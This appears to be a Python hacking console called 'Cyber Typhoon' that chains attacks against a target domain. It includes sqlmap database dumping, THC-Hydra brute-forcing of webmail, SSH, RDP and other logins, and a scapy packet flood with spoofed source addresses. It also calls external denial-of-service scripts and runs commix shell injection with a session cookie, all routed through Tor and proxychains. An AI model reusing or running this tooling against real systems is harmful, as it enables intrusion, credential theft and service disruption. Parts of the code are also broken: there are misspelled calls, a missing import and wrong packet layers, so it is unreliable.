import os 
import sys
from sys import platform  
import time as t
import datetime 
from datetime import datetime
import colorama 
from colorama import Fore, Back, Style
from colorama import init 
import threading 
import socket 
import scapy.all as scapy
from os import system
from sys import stdout
from scapy.all import *
import platform 
import requests
import scapy 
import pandas as pd 
import psutil
from random import randint
import json 
import re 
import urllib 
import pyfiglet 
import webbrowser
from urllib.request import urlopen as open
import logging
from urllib.parse import urljoin
from bs4 import BeautifulSoup
# GUI imports
import tkinter
from tkinter import *
from tkinter import ttk
from PIL import ImageTk, Image 

sys.platform

init()

HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKCYAN = '\033[96m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'


def sys_update():
    os.system(' chmod +x ./newterm.sh')
    subprocess.call(['gnome-terminal', '-x', './newterm.sh'])
    #subprocess.call(['xterm', '-e', 'sudo python3 sys-process.py --columns name,cpu_usage,memory_usage,status -n 20 --sort-by memory_usage --descending --live-update'])
    #subprocess.call(['gnome-terminal', '-x', 'sudo python3 sys-process.py --columns name,cpu_usage,memory_usage,status -n 20 --sort-by memory_usage --descending --live-update'])
    #with tempfile.NamedTemporaryFile(suffix='.command') as f:
    #    f.write('#!/bin/sh\npython3 sys-process.py\n')
    #    subprocess.call(['open', '-W', f.name])
    #subprocess.call('start /wait sudo python3 sys-process.py --columns name,cpu_usage,memory_usage,status -n 20 --sort-by memory_usage --descending --live-update', shell=True)


def script_info():
    print("------ Using Folowing scripts in Linux -----")
    print(""" Commix 
    SQL-MAP
    AJAX
    NMAP
    - my tools - 
    Rube-Scan 
    Recon 
    Sec-Crawl
    Web-port 
    Evil Trcaer 
    SYN-Corn
    UDP-Corn 
    TCP-Corn
    SYN-l
    MAL
    AP-SCan
    SYS-INFO
    SYS
    and more....
    """)

def exit():
    sys.exit()

def CS(X):
    t.sleep(X)
    os.system('clear')

def nmap_scan():
    print("------------------------- Basic Nmap Scan ---------------------- ")
    os.system('nmap -sT -F -sV targethost.com')
    print("-------------------------------- fast nmap advanced with prxychains ---------------------------------")
    os.system(' proxychains nmap -sT -F -sV targethost.com')

def tor_stats():
    print(" \033[36m[\033[35m!\033[36m] \033[31mUsing Service Tor [!]")
    from requests import get
    os.system(' sudo service tor start ')
    ip = get('https://api.ipify.org').text
    print(' \033[36m[\033[35m!\033[36m] \033[31mUsing Host Node => {}'.format(ip))
    #po = socket.gethostbyname(socket.gethostname())
    #print(" Using Host Node => ", po)

def sys_after_stats_main():
    def date():
        date = str(datetime.now())
        print(date)

    def clear():
        if sys.platform == 'win32':
            os.system('cls')
            if sys.platform == 'linux':
                os.system('clear')
                if sys.platform == 'darwin':
                    os.system('clear')

    def restart_program():
        clear()
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()

    def get_size(bytes):
        for unit in ['', 'K', 'M', 'G', 'T', 'P']:
            if bytes < 1024:
                return f"{bytes:.2f}{unit}B"
            bytes /= 1024


    def get_processes_info():
        processes = []
        for process in psutil.process_iter():
            with process.oneshot():
                pid = process.pid
                if pid == 0:
                    continue
                name = process.name()
                try:
                    create_time = datetime.fromtimestamp(process.create_time())
                except OSError:
                    create_time = datetime.fromtimestamp(psutil.boot_time())
                try:
                    cores = len(process.cpu_affinity())
                except psutil.AccessDenied:
                    cores = 0
                cpu_usage = process.cpu_percent()
                status = process.status()
                try:
                    nice = int(process.nice())
                except psutil.AccessDenied:
                    nice = 0
                try:
                    memory_usage = process.memory_full_info().uss
                except psutil.AccessDenied:
                    memory_usage = 0
                io_counters = process.io_counters()
                read_bytes = io_counters.read_bytes
                write_bytes = io_counters.write_bytes
                n_threads = process.num_threads()
                try:
                    username = process.username()
                except psutil.AccessDenied:
                    username = "N/A"
                
            processes.append({
                'pid': pid, 'name': name, 'create_time': create_time,
                'cores': cores, 'cpu_usage': cpu_usage, 'status': status, 'nice': nice,
                'memory_usage': memory_usage, 'read_bytes': read_bytes, 'write_bytes': write_bytes,
                'n_threads': n_threads, 'username': username,
            })

        return processes


    def construct_dataframe(processes):
        df = pd.DataFrame(processes)
        df.set_index('pid', inplace=True)
        df.sort_values(sort_by, inplace=True, ascending=not descending)
        df['memory_usage'] = df['memory_usage'].apply(get_size)
        df['write_bytes'] = df['write_bytes'].apply(get_size)
        df['read_bytes'] = df['read_bytes'].apply(get_size)
        df['create_time'] = df['create_time'].apply(datetime.strftime, args=("%Y-%m-%d %H:%M:%S",))
        df = df[columns.split(",")]
        return df

    if __name__ == "__main__":
        import argparse
        parser = argparse.ArgumentParser(description="Process Monitor")
        parser.add_argument("-c", "--columns", help="""Columns to show,
                                                    available are name,create_time,cores,cpu_usage,status,nice,memory_usage,read_bytes,write_bytes,n_threads,username.
                                                    Default is name,cpu_usage,memory_usage,read_bytes,write_bytes,status,create_time,nice,n_threads,cores.""",
                            default="name,cpu_usage,memory_usage,read_bytes,write_bytes,status,create_time,nice,n_threads,cores")
        parser.add_argument("-s", "--sort-by", dest="sort_by", help="Column to sort by, default is memory_usage .", default="memory_usage")
        parser.add_argument("--descending", action="store_true", help="Whether to sort in descending order.")
        parser.add_argument("-n", help="Number of processes to show, will show all if 0 is specified, default is 25 .", default=25)
        parser.add_argument("-u", "--live-update", action="store_true", help="Whether to keep the program on and updating process information each second")

        # parse arguments
        args = parser.parse_args()
        columns = args.columns
        sort_by = args.sort_by
        descending = args.descending
        n = int(args.n)
        live_update = args.live_update
        processes = get_processes_info()
        df = construct_dataframe(processes)
        if n == 0:
            print(df.to_string())
        elif n > 0:
            print(df.head(n).to_string())
        while live_update:
            processes = get_processes_info()
            df = construct_dataframe(processes)
            os.system("cls") if "nt" in os.name else os.system("clear")
            if n == 0:
                print(df.to_string())
            elif n > 0:
                print(df.head(n).to_string())
            time.sleep(0.1)
            print("-------------------------- Script Running for ----------")
            date()
            print("--------------------------------------------------------")


def NUKE():

    os.system('clear')
    banner() 
    script_info()
    print(" NOTE ]] => if you do not have an injectable URL or want to skip just hit enter ")
    A = str(input(" WWW host                   ===> "))
    print("--------------------------------------------------------------------------------------------------------------------")
    B = str(input(" URL WEB HOST               ===> "))
    print("--------------------------------------------------------------------------------------------------------------------")
    C = str(input(" URL That is SQL Injectable ===> "))
    print("--------------------------------------------------------------------------------------------------------------------")
    em = str(input("URL That is VULNERABLE to shell injection ===> "))
    print("--------------------------------------------------------------------------------------------------------------------")
    cook = str(input(" Session cookie for Shell injectable URL ===> "))
    print("--------------------------------------------------------------------------------------------------------------------")
    print(" please specif POST request string for the Shell injectable URL .")
    POST = str(input(" $>> "))
    print("--------------------------------------------------------------------------------------------------------------------")

    print("Starting framework............")
    t.sleep(5)
        
    
    pp = socket.gethostbyname(f"{A}")

    def target_inf():
        print("-------------------------------------")
        print(" Your Target www IPV4 ==> ", pp)
        print("-------------------------------------")
        print(" == Target OSINT ==")
        #r = requests.get(f'{B}')
        #print(" Response        ===> ",response)
        #print("-----")
        #print(" Response URl    ===> ",response.url)
        #print("-----")
        #print(" Response Code   ===> ",r.status_code)
        #print("")
        #print("")
        print("\033[33m[!] RUNNING WHO IS..... ")
        url = "http://ip-api.com/json/"
        response = open(url + pp)
        data = response.read()
        values = json.loads(data)
        status = values['status']
        success = "success"
        lat = str(values['lat'])
        lon = str(values['lon'])
        a = lat + ","
        b = lon + "/"
        c = b + "data=!3m1!1e3?hl=en"
        location = a + c
        time.sleep(0.1)
        print("")
        print("")
        print("\033[32m [+]\033[36m Response      ====> ", response)
        print("\033[32m [+]\033[36m Response URL  ====> ", response.url)
        print("\033[32m [+]\033[36m HOST IPA      ====> ", pp)
        print("\033[32m [+]\033[36m IP            ====> " + values['query']        )
        print("\033[32m [+]\033[36m Status        ====> " + values['status']   )
        print("\033[32m [+]\033[36m city          ====> " + values['city']       )
        print("\033[32m [+]\033[36m ISP           ====> " + values['isp']         )
        print("\033[32m [+]\033[36m latitude      ====> " + lat              )
        print("\033[32m [+]\033[36m longitude     ====> " + lon             )
        print("\033[32m [+]\033[36m country       ====> " + values['country'] )
        print("\033[32m [+]\033[36m region        ====> " + values['regionName'])
        print("\033[32m [+]\033[36m city          ====> " + values['city']       )
        print("\033[32m [+]\033[36m zip           ====> " + values['zip']         )
        print("\033[32m [+]\033[36m AS            ====> " + values['as']           )
        print("")
        print("")
        print("")
        nmap_scan()



    
    def scan():
        os.system(f' ruby scan.rb {A} ')
        t.sleep(1)
        print("-----------------------------")
        print(" [*] Finished Fast Scan [*] ")
        print("-----------------------------")
        print(" =============================== Open Ports out of 6400 without output wheel ======================== ")
        os.system(f'ruby scan-without.rb {A}')
        t.sleep(5)
        print("\033[96m [!] Running  Slow Scan  [!]")
        print("\033[96m [!] CTRL^C anyytime and continue ")


        remoteServer    = f"{A}"
        remoteServerIP  = socket.gethostbyname(remoteServer)

        # Print a nice banner with information on which host we are about to scan
        print("-" * 60)
        print("Please wait, scanning remote host", remoteServerIP)
        print("-" * 60)


        t1 = datetime.now()

        try:
            for port in range(1,1025):  
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = sock.connect_ex((remoteServerIP, port))
                if result == 0:
                    print("\033[35m Port ===> \033[36m [\033[35m {} \033[36m ] \033[35m Appears To Be Open".format(port))
                sock.close()

        except KeyboardInterrupt:
            print("You pressed Ctrl+C")

        except socket.gaierror:
            print('Hostname could not be resolved. Exiting')

        except socket.error:
            print("Couldn't connect to server")

        t2 = datetime.now()

        total =  t2 - t1

        print('Scanning Completed in: ', total)

    
    def inject():
        print("--------------------------------------------------Using SQLmap to inject => ", pp, "----------------------------------------------------")
        os.system(f' sqlmap -u {C} --dbs &&  sqlmap -u {C} -D acuart--tables ')
        print("==================================================================================================================================================================================")
        list = str(input(" Server Name                ===> "))
        os.system(f'sqlmap -u {C} -D {list}--tables ')
        print("==================================================================================================================================================================================")
        name = str(input(" Table selection EX Artists ===> "))
        print("==================================================================================================================================================================================")
        os.system(f'sqlmap -u {C} -D {list} -T {name} --columns &&  sqlmap -u {C} -D {list} -T {name} -C aname --dump && sqlmap -u {C} -D {list} -T {name} -C aname --dump ')
        print("==================================================================================================================================================================================")
        print("\033[33m SQLI has been preformed and is finished ")
        print(".")
        print(".")
        print(".")
        print(".")
        print(".")
        print(".")
        print(".")
        print(".")
        print(".")
        print(".")
        print(".")
        print(".")
        print(".")
        print("\033[39m ")
        print("\033[34m ")
    
    def brute():
        print("--------------------------------------------- Brute Forcing Login -------------------------------------------------------------- ")
        t.sleep(0.1) 
        print(" NOTE => Brute forcing is a very long process and can take some time so i will open up a new terminal using gnome-terminal and run the ")
        t.sleep(0.1)
        print(" main script here so we can make this process easier ")
        print("_________________________________________________________________")
        print("+ \033[35m[\033[36m + \033[35m] Option A: Gmail Brute (THC-Hydra) ✅️                       +") 
        t.sleep(0.1) 
        print("+ \033[35m[\033[36m + \033[35m] Option B: Yahoo Brute (THC-Hydra) ✅️                       +")
        t.sleep(0.1) 
        print("+ \033[35m[\033[36m + \033[35m] Option C: Hotmail Brute (THC-Hydra) ✅️                     +")
        t.sleep(0.1) 
        print("+ \033[35m[\033[36m + \033[35m] Option D: HTTP Brute (THC-Hydra) ✅️                        +")
        t.sleep(0.1) 
        print("+ \033[35m[\033[36m + \033[35m] Option E: SSH Brute (THC-Hydra) ✅️                         +")
        t.sleep(0.1) 
        print("+ \033[35m[\033[36m + \033[35m] Option F: TelNet Brute (THC-Hydra) ✅️                      +")
        t.sleep(0.1) 
        print("+ \033[35m[\033[36m + \033[35m] Option G: RDP Brute  (THC-Hydra) ✅️                        +")
        t.sleep(0.1) 
        print("+ \033[35m[\033[36m + \033[35m] Option H: MySQL Brute (THC-Hydra)                          +")
        t.sleep(0.1) 
        print("+ \033[35m[\033[36m + \033[35m] Option I: F T P Brute (THC-Hydra)                          +")
        t.sleep(0.1) 
        print("+ \033[35m[\033[36m + \033[35m] Option J: Cisco Brute (THC-Hydra)                          +")
        t.sleep(0.1) 
        print("+ \033[35m[\033[36m + \033[35m] Option K: VNC Brute (THC-Hydra)                            +")
        t.sleep(0.1) 
        print("+ \033[35m[\033[36m + \033[35m] Option L: Router Speedy Brute (THC-Hydra)                  +")
        t.sleep(0.1) 
        print("+===========================================================+")
        t.sleep(0.1) 
        print("\033[39m")
        print(" Please use Capitals if you want to skip just hit Your Enter Key ")
        X = str(input(" Cyber-Typhoon @>> "))

        if 'A' == X:
            t.sleep(1)
            email = str(input(" Email ==> "))
            word = str(input(" Path to Wordlists ==> "))
            os.system(" gnome-terminal --tab -- hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word)) 
        
        elif 'B' == X:
            email = str(input(" email ==> "))
            word = str(input(" wordlist ==> "))
            os.system("gnome-terminal --tab -- hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
        
        elif 'C' == X:
            t.sleep(1)
            email = str(input(" email ==> "))
            word = str(input(" wordlist ==> "))
            os.system("gnome-terminal ==tab -- hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word)) 
        
        elif 'E' == X:
            user = str(input(" User ==> "))
            word = str(input(" Wordlist ==> "))
            iphost = str(input(" IP/Hostname ==> "))
            os.system("gnome-terminal -- hydra -l %s -P %s %s ssh" % (user, word, iphost))
        
        elif 'L' == X:
            user = str(input(" User ==> "))
            word = str(input(" Wordlist ==> "))
            iphost= str(input(" IP/Hostname ==> "))
            os.system("gnome-terminal --tab -- hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
        
        elif 'K' == X:
            word = str(input(" Wordlists ==> "))
            iphost = str(input(" IP/Host ==> "))
            os.system("gnome-terminal --tab -- hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost)) 
        
        elif 'J' == X:
            iphost = str(input(" IP?Hostname ==> "))
            word = str(ionput(" Wordlist ==> "))
            os.system("gnome-terminal --tab -- hydra -P %s %s cisco" % (word, iphost))
        
        elif 'I' == X:
            user = str(input(" User ==> "))
            iphost = str(input(" IP/Hostname "))
            os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
        
        elif 'H' == X:
            user = str(input(" User ==> "))
            word = str(input(" Wordlist ==> "))
            os.system("gnome-erminal --tab -- hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
        
        elif 'G' == X:
            user = str(input(" User ==> "))
            word = str(input(" Wordlist ==> "))
            iphost = str(input(" IP/Hostname ==> "))
            os.system("gnome-terminal --tab -- hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))

        
    def sniper():
        print(" [!] Using Recon tools [!] ")
        os.system(f' cd rec-mod && python3 reconT.py {B} ')
        t.sleep(3)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! nuking !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! nuking !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! nuking !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! nuking !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! nuking !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! nuking !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! nuking !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! nuking !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! nuking !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! nuking !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! nuking !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! nuking !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! nuking !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! nuking !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! nuking !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)


    def fuckitover():
        def randomIP():
            ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
            return ip


        def randInt():
            x = randint(1000,9000)
            return x


        def TCP_Flood(dstIP,dstPort,counter):
            total = 0
            print ("Fuckin the server, DOS 1-4, SENDING 200 Packets ")

            for x in range (0,counter):
                s_port = randInt()
                s_eq = randInt()
                w_indow = randInt()

                IP_Packet = IP ()
                IP_Packet.src = randomIP()
                IP_Packet.dst = dstIP

                ARP_Packet = ARP ()
                ARP_Packet.sport = s_port
                ARP_Packet.dport = dstPort
                ARP_Packet.flags = "S"
                ARP_Packet.seq = s_eq
                ARP_Packet.window = w_indow

                send(IP_Packet/ARP_Packet, verbose=0)
                total+=1

            stdout.write("\nTotal packets sent: %i\n" % total)


        def info():

            dstIP = f'{pp}'
            dstPort = 80

            return dstIP,int(dstPort)


        def main():
            dstIP,dstPort = info()
            counter = 1
            TCP_Flood(dstIP,dstPort,int(counter))

        main()
    
    def fuckitover_V1():
        print(" ------------------------ Second DOS ------------------------ ")
        time.sleep(1)
        os.system(f'sudo python3 saph.py -s {pp} -p 80 ')
    
    def fuckitover_V2():
        os.system(' sudo python3 syn.py ')

    
    def AJAX_SPIDER():
        logging.basicConfig(
            format='%(asctime)s %(levelname)s:%(message)s',
            level=logging.INFO)
        class Crawler:
            def __init__(self, urls=[]):
                self.visited_urls = []
                self.urls_to_visit = urls

            def download_url(self, url):
                return requests.get(url).text

            def get_linked_urls(self, url, html):
                soup = BeautifulSoup(html, 'html.parser')
                for link in soup.find_all('a'):
                    path = link.get('href')
                    if path and path.startswith('/'):
                        path = urljoin(url, path)
                    yield path

            def add_url_to_visit(self, url):
                if url not in self.visited_urls and url not in self.urls_to_visit:
                    self.urls_to_visit.append(url)

            def crawl(self, url):
                html = self.download_url(url)
                for url in self.get_linked_urls(url, html):
                    self.add_url_to_visit(url)

            def run(self):
                while self.urls_to_visit:
                    url = self.urls_to_visit.pop(0)
                    logging.info(f'\033[32m [DATA] \033[34m CRAWLING_SUB_DOMAIN ===> \033[33m {url} ')
                    try:
                        self.crawl(url)
                    except Exception:
                        logging.exception(f'[!] WARNING ===> FAILED TO CRAWL {url}')
                    finally:
                        self.visited_urls.append(url)
            def re(self):
                url1 = re.findall('(?:(?:php?cat=*|ftp):\/\/)?[\w/\-?=%.]+\.[\w/\-&?=%.]+', text)
                print("VULN-FOUND => ", url1)

        if __name__ == '__main__':
            Crawler(urls=[f'{B}']).run()


    if __name__ == "__main__":
        target_inf()
        scan()
        inject()
        brute()
        sniper()
        fuckitover()
        fuckitover_V1()
        print("----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------")
        print(" Copy paste the host => ", pp)
        print("----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------")
        fuckitover_V2()
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        print("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ATTEMPTING SHELL NUKE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(0.1)
        os.system(f'commix -u {em} --cookie={cook} --data={POST} ')
        AJAX_SPIDER()


os.system(' chmod +x ./art.sh && ./art.sh')
print("\033[49m") 
def banner():
    print("""
 _______________________________________________________________________________________________
|                              \033[42m Welcome To\033[49m                                                      |
|                              \033[42m         Server Cyber Typhoon Consol\033[49m                             |
|_______________________________________________________________________________________________|
      \                                  /                      /
       \     .                          /                      /            x
        \                              /        BruteForce\033[49m    /
         \                            /          +           /
          \            +Inject       /                      /
           *                        /                      /
                                   /      .               /
    X                             /                      /            X super secret msf banner 
                                 /                     |||
                                /                    <>NUKE<>
                               /                     <><><><>
                      .       /
     .                       /      .            *           .
                            /
                         SYn + ICMP
                  +                       * Fuck it over

------------------------------------------------------------------------------------------------
""")


def check():
    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo.")
        exit()

def clear():
    os.system('clear')
    if sys.platform == 'win32':
        os.system('cls')
        if sys.platform == 'linux':
            os.system('clear')

clear()

def consol():
    t.sleep(1)
    print(" \033[36m[\033[35m*\033[36m] \033[31mRunning main => @" + platform.node())
    CONSOL = str(input( "\033[36m [\033[36m*\033[36m] Typhoon \033[31m@>> "))

    if 'help' in CONSOL:
        t.sleep(1)
        print("[NUKE] Nuke a domain with as much attacks as possible ")
        t.sleep(1)
        print("")
        print("[DoS]  Pound a server with 3 different packets in all ports ")
        print()
        t.sleep(1)
        print("[clear] Clears the terminal ")
        print()
        t.sleep(1)
        print("[exit] Exits the ternminal ")
        print()
        print("[Dos Art] Prints the dos script art ")
        print("")
        print("[sys-info] => live system info and process clock ")
        t.sleep(1)
        print("thats all, tf you expect? its literally only one option") 
        print("like- cmon..")
        time.sleep(4)
        clear()
        banner()
        tor_stats()
        consol()
        


    # Nuking thwe webiste and actuallyr unning the scan commands 
    elif 'Nuke' in CONSOL:
        t.sleep(1)
        CS(2)
        banner()
        NUKE()


    # dosing and flooding bringing back old hacking scripts 
    elif 'DoS' in CONSOL:
        print("---------------------")
        print(" Ex www.google.com ")
        print("---------------------")
        doshost = str(input("www Host @>> "))
        print("---------------------")
        t.sleep(1)
        c = socket.gethostbyname(doshost)
        clear()
        banner()
        print("Your Target ===> ",c)
        port = str(input(" What Port would you like to launch on? ===> "))
        os.system(f' cd dos && sudo python3 saph.py -s {c} -p {port} ')
    
    elif 'clear' in CONSOL:
                 os.system('clear')
                 banner()
                 consol()
    
    elif 'exit' in CONSOL:
        os.system(' clear ')
        banner()
        print("Goodbye :D")
        sys.exit()
    
    elif 'sys-info' in CONSOL:
        sys_update()
        clear()
        banner()
        consol()
    
    elif 'DoS art' in CONSOL:
        banner()
        time.slep(3)
        clear()
        banner()
        consol()
    
    else:
        print(" [!] Not a command [!] ")
        t.sleep(5)
        clear()
        banner()
        consol()






if __name__ == "__main__":
    clear()
    print("\033[49m")
    #sys_update()
    banner() # print 
    check()
    tor_stats()
    consol()     #interactive consol
    
